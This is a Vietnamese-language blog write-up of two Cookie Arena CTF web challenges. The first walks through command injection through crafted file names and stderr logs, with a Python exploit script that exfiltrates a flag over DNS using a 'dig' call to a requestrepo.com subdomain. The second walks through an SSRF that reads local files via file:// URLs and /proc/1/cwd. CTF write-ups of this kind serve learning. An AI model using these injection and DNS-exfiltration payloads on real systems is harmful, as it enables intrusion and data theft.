@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="A tiny holeĐọc sơ qua source code thì mình có thể dễ dàng đoán được server sẽ thực hiện việc download script từ URL mình nhập vào và thực thi nó. Sau khi test thử một vài đường link thì mình nhận ra k">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cookie Arena Season 1">
+<meta property="og:url" content="https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/index.html">
+<meta property="og:site_name" content="Wのﾑ刀ﾶ乇の11&#39;丂 乃ﾚのム">
+<meta property="og:description" content="A tiny holeĐọc sơ qua source code thì mình có thể dễ dàng đoán được server sẽ thực hiện việc download script từ URL mình nhập vào và thực thi nó. Sau khi test thử một vài đường link thì mình nhận ra k">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/what.jpg">
+<meta property="og:image" content="https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/requestrepo.png">
+<meta property="og:image" content="https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/get_screenshot.png">
+<meta property="og:image" content="https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/proc_1_cwd.png">
+<meta property="article:published_time" content="2021-11-04T11:38:05.000Z">
+<meta property="article:modified_time" content="2022-05-06T05:21:06.730Z">
+<meta property="article:author" content="Wのﾑ刀ﾶ乇の11">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/what.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favion.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Cookie Arena Season 1</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/11/30/ISITDTU-CTF-Quals-2021/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/09/27/DownUnderCTF-2021/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&text=Cookie Arena Season 1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&title=Cookie Arena Season 1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&is_video=false&description=Cookie Arena Season 1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cookie Arena Season 1&body=Check out this article: https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&title=Cookie Arena Season 1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&title=Cookie Arena Season 1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&title=Cookie Arena Season 1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&title=Cookie Arena Season 1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&name=Cookie Arena Season 1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&t=Cookie Arena Season 1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#A-tiny-hole"><span class="toc-number">1.</span> <span class="toc-text">A tiny hole</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Paparazzi"><span class="toc-number">2.</span> <span class="toc-text">Paparazzi</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Cookie Arena Season 1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Wのﾑ刀ﾶ乇の11</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-11-04T11:38:05.000Z" itemprop="datePublished">2021-11-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="A-tiny-hole"><a href="#A-tiny-hole" class="headerlink" title="A tiny hole"></a>A tiny hole</h1><p>Đọc sơ qua source code thì mình có thể dễ dàng đoán được server sẽ thực hiện việc download script từ URL mình nhập vào và thực thi nó. Sau khi test thử một vài đường link thì mình nhận ra không thể kết nối ra bên ngoài. </p>
+<p>Muốn chạy được script thì mình phải bypass qua được đoạn check ở hàm <code>download_script</code> trước:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_script</span>(<span class="params">script_path, command_log, url</span>):</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		script_link = url</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;missing url&quot;</span></span><br><span class="line">	r = requests.Session()</span><br><span class="line">	r.mount(<span class="string">&#x27;file://&#x27;</span>, FileAdapter())</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		result = r.get(script_link)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Oh no! Lost internet&quot;</span></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(script_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(result.content)</span><br><span class="line">		run_script(script_path, command_log)</span><br></pre></td></tr></table></figure>
+
+<p>Để ý thấy dòng <code>r.mount(&#39;file://&#39;, FileAdapter())</code>, mình thử nhập url là <code>file:///etc/passwd</code> thì bypass được hàm này.</p>
+<p>Tiếp đến là hàm <code>run_script</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_script</span>(<span class="params">script_path, command_log</span>):</span></span><br><span class="line">	lf = <span class="built_in">open</span>(command_log, <span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">	command = subprocess.Popen([<span class="string">&#x27;bash&#x27;</span>, script_path], stderr=lf, stdout=lf, universal_newlines=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;Run successfully&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Đoạn code trên sẽ chạy lệnh <code>bash</code> với file <code>script_path</code> được truyền vào, sau đó cả output lẫn error đều được ghi vào file <code>command_log</code></p>
+<p>Nội dung của file <code>script_path</code> được lấy từ url mình cung cấp nhưng do không thể connect ra bên ngoài nên việc chèn reverse shell vào đây là không khả thi.</p>
+<p>Mình control được 2 param đó là <code>script_path</code> và <code>command_log</code> từ đó mình có thể lợi dụng chính lệnh <code>bash</code> để thực thi lệnh tuỳ ý.</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> kemdau &gt; <span class="string">&#x27;date;</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="string"> bash &#x27;</span>date;<span class="string">&#x27; 2&gt; command_log</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="string"> cat command_log</span></span></span><br><span class="line">date;: line 1: kemdau: command not found</span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="string"> bash command_log</span></span></span><br><span class="line">Thu Nov  4 02:48:02 PM +07 2021</span><br></pre></td></tr></table></figure>
+
+<p>Ở đây mình dùng <code>2&gt;</code> để chuyển hướng <code>stderr</code> vào file như hàm <code>run_script</code> ở trên.</p>
+<p>Ý tưởng của mình là tạo 1 file với tên là câu lệnh cần chạy rồi lợi dụng ghi error của lệnh <code>bash</code> vào file <code>command_log</code> và sau đó <code>bash command_log</code> là lệnh sẽ được thực thi.</p>
+<p><em><strong>ưtf is goin on???</strong></em></p>
+<p><img src="/2021/11/04/Cookie-Arena-Season-1/what.jpg" alt="what"></p>
+<p>Vậy còn lệnh <code>cat /flag.txt</code> thì sao? Tên file trong linux thì làm gì đặt được dấu <code>/</code>? Có rất nhiều cách để bypass, mình chọn encode sang base64.</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;cat /flag.txt&quot;</span> | base64</span></span><br><span class="line">Y2F0IC9mbGFnLnR4dAo=</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> Y2F0IC9mbGFnLnR4dAo= | base64 -d | bash</span></span><br><span class="line">cat: /flag.txt: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>Nhưng không có internet thì làm sao mà gửi flag về? Với những chall kiểu như này mình sẽ thử dùng DNS để bypass.</p>
+<p>Mình sử dụng lệnh <code>dig</code> để query và <a target="_blank" rel="noopener" href="https://requestrepo.com/">requestrepo.com</a> để hứng DNS.</p>
+<p>Và đây là payload của mình:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dig $(<span class="built_in">echo</span> Y2F0IC9mbGFnLnR4dAo= | base64 -d | bash).jrl0lymn.requestrepo.com</span></span><br></pre></td></tr></table></figure>
+
+<p>Còn đây là script của mình:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://chal17.web.letspentest.org/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span>(<span class="params"><span class="built_in">dir</span>, name, url, log</span>):</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&#x27;script_dir&#x27;</span>: <span class="built_in">dir</span>,</span><br><span class="line">        <span class="string">&#x27;script_name&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;script_url&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;command_log_file&#x27;</span>: log</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(URL + <span class="string">&#x27;/runScript&#x27;</span>, data=payload)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">core_payload = <span class="string">b&#x27;cat /flag.txt&#x27;</span></span><br><span class="line">core_payload = b64encode(core_payload).decode()</span><br><span class="line"></span><br><span class="line">dirname = randstr()</span><br><span class="line"></span><br><span class="line">send_payload(dirname, <span class="string">f&#x27;\ndig $(echo <span class="subst">&#123;core_payload&#125;</span> | base64 -d | bash).jrl0lymn.requestrepo.com;&#x27;</span>, <span class="string">&#x27;file:///etc/hosts&#x27;</span>, <span class="string">&#x27;log&#x27;</span>)</span><br><span class="line">send_payload(dirname, <span class="string">&#x27;bruh&#x27;</span>, <span class="string">&#x27;file:///src/logs/log.txt&#x27;</span>, <span class="string">&#x27;log1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Hứng DNS:</p>
+<p><img src="/2021/11/04/Cookie-Arena-Season-1/requestrepo.png" alt="requestrepo"></p>
+<p>Flag: <code>Flag&#123;CookieWarrior_Please_Think_Out_Of_The_Box&#125;</code></p>
+<h1 id="Paparazzi"><a href="#Paparazzi" class="headerlink" title="Paparazzi"></a>Paparazzi</h1><p>Sau khi dạo một vòng, mình nhận thấy ở đây chỉ có nhập vào URL nên mình đoán đây rất có thể là một bài SSRF. Mình khi nhập thử <code>file:///</code> vào mình nhận được json có chứa tên một file png:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">&quot;status&quot;</span>: <span class="string">&quot;4f5637f9e6ab447aa20ae338d04eb7a8.png&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Mình tiếp tục tìm trong source thì thấy một đoạn js có vẻ khả nghi:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getHistory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	src = []</span><br><span class="line">	<span class="keyword">const</span> response = <span class="keyword">await</span> fetch(<span class="built_in">window</span>.location.origin + <span class="string">&quot;/get_all_screenshot&quot;</span>);</span><br><span class="line">	<span class="keyword">var</span> data = <span class="keyword">await</span> response.json();</span><br><span class="line">	<span class="keyword">let</span> tab = <span class="string">`&lt;h1&gt;History&lt;/h1&gt;`</span>;</span><br><span class="line">	<span class="built_in">console</span>.log(data.status)</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">let</span> r <span class="keyword">of</span> data.status) &#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">`&lt;img src=&quot;<span class="subst">$&#123;<span class="built_in">window</span>.location.origin&#125;</span>/get_screenshot?file=<span class="subst">$&#123;r&#125;</span>&quot;&gt;`</span>);</span><br><span class="line">		tab += <span class="string">`&lt;img src=&quot;<span class="subst">$&#123;<span class="built_in">window</span>.location.origin&#125;</span>/get_screenshot?file=<span class="subst">$&#123;r&#125;</span>&quot;&gt;`</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">document</span>.getElementById(<span class="string">&quot;history&quot;</span>).innerHTML = tab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Ở đây <code>get_screenshot?file=</code> có vẻ là chỗ để xem file .png ở trên. Boom, và mình đã có screenshot của <code>/</code></p>
+<p><code>http://chal8.web.letspentest.org/get_screenshot?file=4f5637f9e6ab447aa20ae338d04eb7a8.png</code></p>
+<p><img src="/2021/11/04/Cookie-Arena-Season-1/get_screenshot.png" alt="get_screenshot"></p>
+<p>Sau khi thử tìm lần lượt trong các thư mục đều không thấy flag, riêng <code>/src</code> lại bị <code>url invalid</code>, mình cũng thử với các URL khác có chứa từ <code>src</code> thì nhận ra là từ khoá này đã bị block:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">&quot;status&quot;</span>: <span class="string">&quot;invalid url&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Để bypass cái này và truy cập vào <code>src</code> mình dùng thư mục <code>/proc/[pid]/cwd</code>:</p>
+<blockquote>
+<p>/proc/[pid]/cwd<br>This is a symbolic link to the current working directory of the process.  To find out the current working directory of process 20, for instance, you can do this:<br>$ cd /proc/20/cwd; pwd -P</p>
+</blockquote>
+<p>Mình thử với <code>pid = 1</code> thì thấy một thư mục có khả năng cao là chứa flag:</p>
+<p><img src="/2021/11/04/Cookie-Arena-Season-1/proc_1_cwd.png" alt="proc_1_cwd"></p>
+<p>Tiếp tục đi vào trong thì mình tìm được flag.</p>
+<p>Flag: <code>FLAG&#123;abc725173fa1828ea019503669b4eecd&#125;</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#A-tiny-hole"><span class="toc-number">1.</span> <span class="toc-text">A tiny hole</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Paparazzi"><span class="toc-number">2.</span> <span class="toc-text">Paparazzi</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&text=Cookie Arena Season 1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&title=Cookie Arena Season 1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&is_video=false&description=Cookie Arena Season 1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cookie Arena Season 1&body=Check out this article: https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&title=Cookie Arena Season 1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&title=Cookie Arena Season 1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&title=Cookie Arena Season 1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&title=Cookie Arena Season 1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&name=Cookie Arena Season 1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/&t=Cookie Arena Season 1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Wのﾑ刀ﾶ乇の11
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
